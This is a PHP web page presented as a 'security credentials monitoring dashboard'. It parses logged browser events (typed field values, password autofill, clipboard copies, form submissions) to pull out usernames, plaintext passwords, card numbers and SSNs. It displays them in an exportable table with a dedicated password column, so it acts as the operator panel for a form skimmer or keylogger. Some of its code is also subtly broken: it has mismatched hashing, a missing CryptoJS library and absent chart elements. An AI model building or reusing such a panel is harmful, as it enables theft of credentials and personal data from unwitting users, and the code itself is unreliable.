<?php
// credentials_dashboard.php
$title = "Advanced Security Credentials Monitoring Dashboard";
require_once '../includes/auth.php';
require_once '../includes/config.php';
require_once '../includes/db.php';

// Enhanced admin verification with IP whitelisting
requireAdmin(); 

// Configuration
$logFiles = [
    '../logs/raw_activity.log',
    '../logs/activity.log',
    '../logs/user_activity.log'
];
$maxFileSize = 50 * 1024 * 1024; // 50MB
$retentionDays = 90;

// Function to safely read log files with rotation check
function readLogWithRotation($filePath) {
    global $maxFileSize;
    
    if (!file_exists($filePath)) return '';
    
    // Check if log rotation is needed
    if (filesize($filePath) > $maxFileSize) {
        $backupPath = $filePath . '.' . date('Ymd-His');
        rename($filePath, $backupPath);
        file_put_contents($filePath, '');
    }
    
    return file_get_contents($filePath);
}

// Enhanced data extraction with pattern matching
function extractSensitiveData($logContent) {
    $entries = [];
    $lines = explode("\n", $logContent);
    $patternMap = [
        'credit_card' => '/\b(?:\d[ -]*?){13,16}\b/',
        'ssn' => '/\b\d{3}[ -]?\d{2}[ -]?\d{4}\b/',
        'email' => '/\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/',
        'phone' => '/\b(?:\+?(\d{1,3}))?[-. (]*(\d{3})[-. )]*(\d{3})[-. ]*(\d{4})\b/'
    ];
    
    foreach ($lines as $line) {
        if (empty(trim($line))) continue;
        
        $jsonStart = strpos($line, '{');
        if ($jsonStart === false) continue;
        
        $jsonStr = substr($line, $jsonStart);
        $data = @json_decode($jsonStr, true);
        if (!$data) continue;
        
        // Base entry structure
        $entry = [
            'timestamp' => $data['timestamp'] ?? '',
            'action' => $data['action'] ?? '',
            'type' => 'Generic',
            'page' => $data['page'] ?? '',
            'ip_address' => $data['ip_address'] ?? ($data['ip'] ?? 'N/A'),
            'user_agent' => $data['userAgent'] ?? ($data['user_agent'] ?? 'N/A'),
            'username' => '',
            'password' => '',
            'sensitive_data' => [],
            'target_element' => '',
            'risk_score' => 0,
            'session_id' => $data['session_id'] ?? ($data['tracking_id'] ?? ''),
            'geolocation' => 'N/A',
            'device_fingerprint' => $data['fingerprint'] ?? '',
            'status' => 'Logged',
            'evidence' => $line
        ];
        
        // Enhanced pattern matching
        foreach ($patternMap as $patternType => $regex) {
            if (preg_match_all($regex, $jsonStr, $matches)) {
                foreach ($matches[0] as $match) {
                    $entry['sensitive_data'][$patternType][] = $match;
                    $entry['risk_score'] += 10; // Increase risk for each sensitive pattern
                }
            }
        }
        
        // Action-specific processing
        if (isset($data['action'])) {
            switch ($data['action']) {
                case 'input_change':
                    $entry['type'] = 'Form Input';
                    $entry['target_element'] = ($data['tag'] ?? '') . 
                        (isset($data['id']) ? '#'.$data['id'] : '') . 
                        (isset($data['class']) ? '.'.$data['class'] : '');
                    
                    if (isset($data['name'])) {
                        if (stripos($data['name'], 'user') !== false) {
                            $entry['username'] = $data['newValue'] ?? '';
                            $entry['risk_score'] += 15;
                        }
                        elseif (stripos($data['name'], 'pass') !== false) {
                            $entry['password'] = $data['newValue'] ?? '';
                            $entry['risk_score'] += 25;
                        }
                    }
                    break;
                    
                case 'password_autofill':
                    $entry['type'] = 'Password Autofill';
                    $entry['risk_score'] += 20;
                    $entry['target_element'] = 'input[name="'.($data['fieldName'] ?? '').'"]';
                    break;
                    
                case 'login_attempt':
                    $entry['type'] = 'Login Attempt';
                    $entry['risk_score'] += 30;
                    $entry['username'] = $data['username'] ?? '';
                    $entry['status'] = 'Attempted';
                    break;
                    
                case 'copy':
                    $entry['type'] = 'Clipboard Copy';
                    $entry['risk_score'] += 5;
                    $entry['target_element'] = ($data['targetTag'] ?? '') . 
                        (isset($data['targetId']) ? '#'.$data['targetId'] : '') . 
                        (isset($data['targetClass']) ? '.'.$data['targetClass'] : '');
                    break;
                    
                case 'form_submit':
                    $entry['type'] = 'Form Submission';
                    $entry['risk_score'] += 35;
                    $entry['status'] = 'Submitted';
                    
                    // Parse form data for sensitive info
                    if (isset($data['formData'])) {
                        $formData = is_string($data['formData']) ? json_decode($data['formData'], true) : $data['formData'];
                        foreach ($formData as $key => $value) {
                            if (stripos($key, 'pass') !== false) {
                                $entry['password'] = $value;
                                $entry['risk_score'] += 25;
                            }
                            elseif (stripos($key, 'user') !== false) {
                                $entry['username'] = $value;
                                $entry['risk_score'] += 15;
                            }
                        }
                    }
                    break;
            }
        }
        
        // Add geolocation data if IP is available
        if (!empty($entry['ip_address']) && $entry['ip_address'] != 'N/A') {
            $entry['geolocation'] = getIpGeolocation($entry['ip_address']);
        }
        
        // Calculate final risk level
        $entry['risk_level'] = calculateRiskLevel($entry['risk_score']);
        
        $entries[] = $entry;
    }
    
    return $entries;
}

// Helper function to get IP geolocation
function getIpGeolocation($ip) {
    if ($ip === '127.0.0.1') return 'Localhost';
    
    try {
        $url = "http://ip-api.com/json/$ip";
        $response = file_get_contents($url);
        $data = json_decode($response, true);
        
        if ($data && $data['status'] === 'success') {
            return $data['country'] . ', ' . $data['city'] . ' (' . $data['isp'] . ')';
        }
    } catch (Exception $e) {
        error_log("Geolocation error: " . $e->getMessage());
    }
    
    return 'Unknown';
}

// Risk level calculation
function calculateRiskLevel($score) {
    if ($score >= 50) return 'Critical';
    if ($score >= 30) return 'High';
    if ($score >= 15) return 'Medium';
    return 'Low';
}

// Read and process all log files
$allEntries = [];
foreach ($logFiles as $logFile) {
    $logContent = readLogWithRotation($logFile);
    $allEntries = array_merge($allEntries, extractSensitiveData($logContent));
}

// Sort by timestamp descending
usort($allEntries, function($a, $b) {
    return strtotime($b['timestamp']) - strtotime($a['timestamp']);
});
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title><?php echo htmlspecialchars($title); ?></title>
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.min.css">
    <link rel="stylesheet" href="https://cdn.datatables.net/buttons/2.2.2/css/buttons.dataTables.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root {
            --critical: #e74c3c;
            --high: #f39c12;
            --medium: #f1c40f;
            --low: #2ecc71;
            --info: #3498db;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f7fa;
            color: #333;
        }
        
        .container {
            padding: 20px;
            max-width: 99%;
            margin: 0 auto;
        }
        
        .dashboard-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #ddd;
        }
        
        .dashboard-title {
            color: #215967;
            margin: 0;
            font-size: 28px;
        }
        
        .dashboard-controls {
            display: flex;
            gap: 10px;
        }
        
        .security-table {
            width: 100%;
            margin: 20px 0;
            font-size: 0.9em;
            border-collapse: separate;
            border-spacing: 0;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
        }
        
        .security-table thead tr {
            background-color: #2c3e50;
            color: #ffffff;
        }
        
        .security-table th {
            padding: 12px 15px;
            text-align: left;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        .security-table td {
            padding: 10px 15px;
            vertical-align: top;
            border-bottom: 1px solid #e0e0e0;
        }
        
        .security-table tbody tr {
            transition: background-color 0.2s;
        }
        
        .security-table tbody tr:nth-of-type(even) {
            background-color: #f8f9fa;
        }
        
        .security-table tbody tr:hover {
            background-color: #e9f7fe;
        }
        
        .risk-critical {
            background-color: rgba(231, 76, 60, 0.1);
            border-left: 4px solid var(--critical);
        }
        
        .risk-high {
            background-color: rgba(243, 156, 18, 0.1);
            border-left: 4px solid var(--high);
        }
        
        .risk-medium {
            background-color: rgba(241, 196, 15, 0.1);
            border-left: 4px solid var(--medium);
        }
        
        .risk-low {
            background-color: rgba(46, 204, 113, 0.1);
            border-left: 4px solid var(--low);
        }
        
        .badge {
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            font-weight: bold;
            color: white;
            display: inline-block;
            min-width: 70px;
            text-align: center;
        }
        
        .badge-critical {
            background-color: var(--critical);
        }
        
        .badge-high {
            background-color: var(--high);
        }
        
        .badge-medium {
            background-color: var(--medium);
        }
        
        .badge-low {
            background-color: var(--low);
        }
        
        .badge-info {
            background-color: var(--info);
        }
        
        .sensitive-value {
            font-family: 'Courier New', monospace;
            background-color: #fff8e1;
            padding: 2px 4px;
            border-radius: 3px;
            word-break: break-all;
        }
        
        .username-value {
            color: #2980b9;
            font-weight: bold;
        }
        
        .password-value {
            color: #c0392b;
            font-weight: bold;
        }
        
        .action-btn {
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 0.8em;
            transition: all 0.2s;
        }
        
        .action-btn:hover {
            opacity: 0.8;
        }
        
        .btn-view {
            background-color: #3498db;
            color: white;
        }
        
        .btn-block {
            background-color: #e74c3c;
            color: white;
        }
        
        .btn-allow {
            background-color: #2ecc71;
            color: white;
        }
        
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .stat-card {
            background: white;
            border-radius: 8px;
            padding: 15px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            display: flex;
            flex-direction: column;
        }
        
        .stat-card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        
        .stat-card-title {
            font-size: 0.9em;
            color: #7f8c8d;
            font-weight: 600;
        }
        
        .stat-card-value {
            font-size: 1.8em;
            font-weight: bold;
            color: #2c3e50;
        }
        
        .stat-card-footer {
            font-size: 0.8em;
            color: #95a5a6;
            margin-top: auto;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            z-index: 1000;
            overflow: auto;
        }
        
        .modal-content {
            background-color: #fff;
            margin: 5% auto;
            padding: 20px;
            border-radius: 8px;
            width: 80%;
            max-width: 900px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
            max-height: 80vh;
            overflow-y: auto;
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eee;
        }
        
        .modal-title {
            font-size: 1.5em;
            color: #2c3e50;
            margin: 0;
        }
        
        .close-modal {
            background: none;
            border: none;
            font-size: 1.5em;
            cursor: pointer;
            color: #7f8c8d;
        }
        
        .timeline-container {
            margin-top: 30px;
        }
        
        .timeline-item {
            position: relative;
            padding-left: 30px;
            margin-bottom: 20px;
            border-left: 2px solid #3498db;
        }
        
        .timeline-time {
            font-size: 0.8em;
            color: #7f8c8d;
            margin-bottom: 5px;
        }
        
        .timeline-content {
            background: #f8f9fa;
            padding: 10px 15px;
            border-radius: 6px;
        }
        
        .filter-container {
            background: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        
        .filter-row {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            margin-bottom: 10px;
        }
        
        .filter-group {
            flex: 1;
            min-width: 200px;
        }
        
        .filter-label {
            display: block;
            margin-bottom: 5px;
            font-size: 0.9em;
            color: #7f8c8d;
        }
        
        .filter-input {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 0.9em;
        }
        
        .filter-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 10px;
        }
        
        .chart-container {
            background: white;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 20px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
            height: 300px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dashboard-header">
            <h1 class="dashboard-title">
                <i class="fas fa-shield-alt"></i> <?php echo htmlspecialchars($title); ?>
            </h1>
            <div class="dashboard-controls">
                <button id="refreshBtn" class="action-btn btn-info">
                    <i class="fas fa-sync-alt"></i> Refresh
                </button>
                <button id="exportBtn" class="action-btn btn-info">
                    <i class="fas fa-file-export"></i> Export
                </button>
            </div>
        </div>
        
        <!-- Statistics Cards -->
        <div class="stats-container">
            <div class="stat-card">
                <div class="stat-card-header">
                    <span class="stat-card-title">Total Events</span>
                    <i class="fas fa-chart-bar"></i>
                </div>
                <div class="stat-card-value"><?php echo count($allEntries); ?></div>
                <div class="stat-card-footer">Last 24h: <?php echo count(array_filter($allEntries, function($e) {
                    return strtotime($e['timestamp']) > strtotime('-24 hours');
                })); ?></div>
            </div>
            
            <div class="stat-card">
                <div class="stat-card-header">
                    <span class="stat-card-title">Critical Risks</span>
                    <i class="fas fa-exclamation-triangle"></i>
                </div>
                <div class="stat-card-value" style="color: var(--critical);">
                    <?php echo count(array_filter($allEntries, function($e) {
                        return $e['risk_level'] === 'Critical';
                    })); ?>
                </div>
                <div class="stat-card-footer">Requires immediate attention</div>
            </div>
            
            <div class="stat-card">
                <div class="stat-card-header">
                    <span class="stat-card-title">Login Attempts</span>
                    <i class="fas fa-sign-in-alt"></i>
                </div>
                <div class="stat-card-value">
                    <?php echo count(array_filter($allEntries, function($e) {
                        return $e['type'] === 'Login Attempt';
                    })); ?>
                </div>
                <div class="stat-card-footer">Failed: <?php echo count(array_filter($allEntries, function($e) {
                    return $e['type'] === 'Login Attempt' && $e['status'] === 'Attempted';
                })); ?></div>
            </div>
            
            <div class="stat-card">
                <div class="stat-card-header">
                    <span class="stat-card-title">Password Exposures</span>
                    <i class="fas fa-key"></i>
                </div>
                <div class="stat-card-value" style="color: var(--high);">
                    <?php echo count(array_filter($allEntries, function($e) {
                        return !empty($e['password']);
                    })); ?>
                </div>
                <div class="stat-card-footer">Including autofill events</div>
            </div>
        </div>
        
        <!-- Filter Controls -->
        <div class="filter-container">
            <div class="filter-row">
                <div class="filter-group">
                    <label class="filter-label">Date Range</label>
                    <input type="date" id="dateFrom" class="filter-input">
                </div>
                <div class="filter-group">
                    <label class="filter-label">to</label>
                    <input type="date" id="dateTo" class="filter-input">
                </div>
                <div class="filter-group">
                    <label class="filter-label">Risk Level</label>
                    <select id="riskLevel" class="filter-input">
                        <option value="">All</option>
                        <option value="Critical">Critical</option>
                        <option value="High">High</option>
                        <option value="Medium">Medium</option>
                        <option value="Low">Low</option>
                    </select>
                </div>
            </div>
            <div class="filter-row">
                <div class="filter-group">
                    <label class="filter-label">Event Type</label>
                    <select id="eventType" class="filter-input">
                        <option value="">All</option>
                        <option value="Login Attempt">Login Attempt</option>
                        <option value="Password Autofill">Password Autofill</option>
                        <option value="Form Input">Form Input</option>
                        <option value="Form Submission">Form Submission</option>
                        <option value="Clipboard Copy">Clipboard Copy</option>
                    </select>
                </div>
                <div class="filter-group">
                    <label class="filter-label">IP Address</label>
                    <input type="text" id="ipFilter" class="filter-input" placeholder="Filter by IP">
                </div>
                <div class="filter-group">
                    <label class="filter-label">Username</label>
                    <input type="text" id="usernameFilter" class="filter-input" placeholder="Filter by username">
                </div>
            </div>
            <div class="filter-actions">
                <button id="resetFilters" class="action-btn">
                    <i class="fas fa-undo"></i> Reset
                </button>
                <button id="applyFilters" class="action-btn btn-info">
                    <i class="fas fa-filter"></i> Apply Filters
                </button>
            </div>
        </div>
        
        <!-- Main Data Table -->
        <table id="securityTable" class="security-table display nowrap" style="width:100%">
            <thead>
                <tr>
                    <th>Timestamp</th>
                    <th>Event Type</th>
                    <th>Risk Level</th>
                    <th>Details</th>
                    <th>User/IP</th>
                    <th>Location</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Sensitive Data</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php foreach ($allEntries as $entry): ?>
                <tr class="risk-<?php echo strtolower($entry['risk_level']); ?>">
                    <td>
                        <?php echo !empty($entry['timestamp']) ? 
                            date('M j, H:i:s', strtotime($entry['timestamp'])) : 'N/A'; ?>
                    </td>
                    <td><?php echo htmlspecialchars($entry['type']); ?></td>
                    <td>
                        <span class="badge badge-<?php echo strtolower($entry['risk_level']); ?>">
                            <?php echo htmlspecialchars($entry['risk_level']); ?>
                        </span>
                    </td>
                    <td>
                        <div><?php echo htmlspecialchars($entry['action']); ?></div>
                        <small class="text-muted">
                            <?php echo htmlspecialchars(basename($entry['page'])); ?>
                        </small>
                    </td>
                    <td>
                        <div><?php echo htmlspecialchars($entry['ip_address']); ?></div>
                        <small class="text-muted">
                            <?php echo htmlspecialchars(substr($entry['user_agent'], 0, 30) . 
                                (strlen($entry['user_agent']) > 30 ? '...' : '')); ?>
                        </small>
                    </td>
                    <td><?php echo htmlspecialchars($entry['geolocation']); ?></td>
                    <td class="username-value">
                        <?php echo htmlspecialchars($entry['username']); ?>
                    </td>
                    <td class="password-value sensitive-value">
                        <?php echo htmlspecialchars($entry['password']); ?>
                    </td>
                    <td>
                        <?php if (!empty($entry['sensitive_data'])): ?>
                            <ul style="margin: 0; padding-left: 20px;">
                                <?php foreach ($entry['sensitive_data'] as $type => $values): ?>
                                    <li>
                                        <strong><?php echo ucfirst($type); ?>:</strong> 
                                        <?php echo htmlspecialchars(implode(', ', $values)); ?>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        <?php endif; ?>
                    </td>
                    <td>
                        <button class="action-btn btn-view view-details" data-id="<?php echo md5($entry['evidence']); ?>">
                            <i class="fas fa-search"></i> Details
                        </button>
                        <?php if ($entry['risk_level'] === 'Critical' || $entry['risk_level'] === 'High'): ?>
                            <button class="action-btn btn-block" style="margin-top: 5px;">
                                <i class="fas fa-ban"></i> Block
                            </button>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
        
        <!-- Details Modal -->
        <div id="detailsModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title">Event Details</h3>
                    <button class="close-modal">&times;</button>
                </div>
                <div id="modalBody"></div>
                <div class="timeline-container" id="relatedEvents">
                    <h4>Related Events</h4>
                    <!-- Will be populated by JavaScript -->
                </div>
            </div>
        </div>
    </div>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/2.2.2/js/dataTables.buttons.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.html5.min.js"></script>
    <script src="https://cdn.datatables.net/buttons/2.2.2/js/buttons.print.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    
    <script>
        $(document).ready(function() {
            // Initialize DataTable with enhanced features
            const table = $('#securityTable').DataTable({
                dom: 'Bfrtip',
                buttons: [
                    'copy', 'csv', 'excel', 'pdf', 'print'
                ],
                pageLength: 25,
                order: [[0, 'desc']],
                responsive: true,
                scrollX: true,
                columnDefs: [
                    { responsivePriority: 1, targets: 0 }, // Timestamp
                    { responsivePriority: 2, targets: 2 }, // Risk Level
                    { responsivePriority: 3, targets: 6 }, // Username
                    { responsivePriority: 4, targets: 7 }, // Password
                    { responsivePriority: 5, targets: -1 } // Actions
                ]
            });
            
            // Apply filters
            $('#applyFilters').click(function() {
                const dateFrom = $('#dateFrom').val();
                const dateTo = $('#dateTo').val();
                const riskLevel = $('#riskLevel').val();
                const eventType = $('#eventType').val();
                const ipFilter = $('#ipFilter').val();
                const usernameFilter = $('#usernameFilter').val();
                
                table.columns().search('').draw(); // Reset all filters
                
                // Apply date range filter
                if (dateFrom || dateTo) {
                    $.fn.dataTable.ext.search.push(function(settings, data, dataIndex) {
                        const rowDate = new Date(data[0]);
                        const fromDate = dateFrom ? new Date(dateFrom) : null;
                        const toDate = dateTo ? new Date(dateTo + 'T23:59:59') : null;
                        
                        if (fromDate && rowDate < fromDate) return false;
                        if (toDate && rowDate > toDate) return false;
                        return true;
                    });
                }
                
                // Apply other filters
                if (riskLevel) table.column(2).search(riskLevel).draw();
                if (eventType) table.column(1).search(eventType).draw();
                if (ipFilter) table.column(4).search(ipFilter).draw();
                if (usernameFilter) table.column(6).search(usernameFilter).draw();
                
                table.draw();
                $.fn.dataTable.ext.search.pop(); // Remove date filter function
            });
            
            // Reset filters
            $('#resetFilters').click(function() {
                $('#dateFrom, #dateTo, #riskLevel, #eventType, #ipFilter, #usernameFilter').val('');
                table.columns().search('').draw();
            });
            
            // View details modal
            $('.view-details').click(function() {
                const eventId = $(this).data('id');
                const rowData = table.row($(this).closest('tr')).data();
                
                // Format modal content
                let modalHtml = `
                    <div class="detail-section">
                        <h4>Event Information</h4>
                        <table class="detail-table">
                            <tr>
                                <th>Timestamp:</th>
                                <td>${rowData[0]}</td>
                            </tr>
                            <tr>
                                <th>Event Type:</th>
                                <td>${rowData[1]}</td>
                            </tr>
                            <tr>
                                <th>Risk Level:</th>
                                <td>${rowData[2]}</td>
                            </tr>
                            <tr>
                                <th>Page:</th>
                                <td>${rowData[3].split('<')[0].trim()}</td>
                            </tr>
                            <tr>
                                <th>IP Address:</th>
                                <td>${rowData[4].split('<')[0].trim()}</td>
                            </tr>
                            <tr>
                                <th>Location:</th>
                                <td>${rowData[5]}</td>
                            </tr>
                            <tr>
                                <th>User Agent:</th>
                                <td>${rowData[4].split('<small')[1] ? 
                                    rowData[4].split('<small')[1].replace(/.*>/, '').replace(/<.*/, '') : 
                                    'N/A'}</td>
                            </tr>
                        </table>
                    </div>
                    
                    <div class="detail-section">
                        <h4>Sensitive Data</h4>
                        <pre id="rawData"></pre>
                    </div>
                `;
                
                $('#modalBody').html(modalHtml);
                
                // Find the original entry data
                const originalEntry = <?php echo json_encode($allEntries); ?>.find(e => 
                    md5(JSON.stringify(e.evidence)) === eventId
                );
                
                if (originalEntry) {
                    $('#rawData').text(JSON.stringify(originalEntry, null, 2));
                    
                    // Show related events (same IP or same session)
                    const relatedEvents = <?php echo json_encode($allEntries); ?>.filter(e => 
                        (e.ip_address === originalEntry.ip_address || 
                         e.session_id === originalEntry.session_id) && 
                        md5(JSON.stringify(e.evidence)) !== eventId
                    ).slice(0, 5); // Limit to 5 related events
                    
                    if (relatedEvents.length > 0) {
                        let timelineHtml = '';
                        relatedEvents.forEach(event => {
                            timelineHtml += `
                                <div class="timeline-item">
                                    <div class="timeline-time">
                                        ${new Date(event.timestamp).toLocaleString()}
                                    </div>
                                    <div class="timeline-content">
                                        <strong>${event.type}</strong>: ${event.action}<br>
                                        <small>${event.page}</small>
                                    </div>
                                </div>
                            `;
                        });
                        
                        $('#relatedEvents').append(timelineHtml);
                    } else {
                        $('#relatedEvents').append('<p>No related events found.</p>');
                    }
                }
                
                $('#detailsModal').show();
            });
            
            // Close modal
            $('.close-modal').click(function() {
                $('#detailsModal').hide();
                $('#relatedEvents').empty();
            });
            
            // Click outside modal to close
            $(window).click(function(event) {
                if (event.target === document.getElementById('detailsModal')) {
                    $('#detailsModal').hide();
                    $('#relatedEvents').empty();
                }
            });
            
            // Refresh button
            $('#refreshBtn').click(function() {
                location.reload();
            });
            
            // Export button
            $('#exportBtn').click(function() {
                table.button('.buttons-excel').trigger();
            });
            
            // Initialize charts
            initializeCharts();
        });
        
        function initializeCharts() {
            // Risk Level Distribution Pie Chart
            const riskLevels = ['Critical', 'High', 'Medium', 'Low'];
            const riskCounts = riskLevels.map(level => 
                <?php echo json_encode($allEntries); ?>.filter(e => e.risk_level === level).length
            );
            
            const riskColors = [
                'rgba(231, 76, 60, 0.7)',
                'rgba(243, 156, 18, 0.7)',
                'rgba(241, 196, 15, 0.7)',
                'rgba(46, 204, 113, 0.7)'
            ];
            
            new Chart(document.getElementById('riskChart'), {
                type: 'pie',
                data: {
                    labels: riskLevels,
                    datasets: [{
                        data: riskCounts,
                        backgroundColor: riskColors,
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    plugins: {
                        legend: {
                            position: 'right'
                        },
                        title: {
                            display: true,
                            text: 'Risk Level Distribution'
                        }
                    }
                }
            });
            
            // Event Type Distribution Bar Chart
            const eventTypes = [...new Set(<?php echo json_encode($allEntries); ?>.map(e => e.type))];
            const eventCounts = eventTypes.map(type => 
                <?php echo json_encode($allEntries); ?>.filter(e => e.type === type).length
            );
            
            new Chart(document.getElementById('eventTypeChart'), {
                type: 'bar',
                data: {
                    labels: eventTypes,
                    datasets: [{
                        label: 'Event Count',
                        data: eventCounts,
                        backgroundColor: 'rgba(52, 152, 219, 0.7)',
                        borderWidth: 1
                    }]
                },
                options: {
                    responsive: true,
                    scales: {
                        y: {
                            beginAtZero: true
                        }
                    },
                    plugins: {
                        legend: {
                            display: false
                        },
                        title: {
                            display: true,
                            text: 'Event Type Distribution'
                        }
                    }
                }
            });
        }
        
        // Simple MD5 function for demo purposes
        function md5(str) {
            return CryptoJS.MD5(str).toString();
        }
    </script>
</body>
</html>